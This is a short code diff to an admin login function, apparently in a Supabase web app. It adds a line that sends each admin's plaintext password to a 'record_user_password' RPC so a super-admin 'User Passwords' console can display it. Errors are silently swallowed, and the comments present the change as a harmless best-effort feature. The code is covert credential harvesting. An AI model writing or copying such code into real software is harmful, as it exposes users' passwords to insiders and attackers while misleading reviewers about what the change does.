@@ -55,6 +55,11 @@ export async function authenticateAdmin(
     // If a temp password is in force, prime the dashboard signal.
     primeForcePasswordResetIfNeeded(data.user)
 
+    // Mirror the admin's current password into the super-admin "User
+    // Passwords" console (idempotent RPC — only writes when the value is
+    // new). Best-effort; never affects login.
+    try { await supabase.rpc('record_user_password', { p_password: password } as any) } catch { /* non-fatal */ }
+
     // Fetch profile with role
     const { data: profile, error: profileError } = await supabase
       .from('profiles')
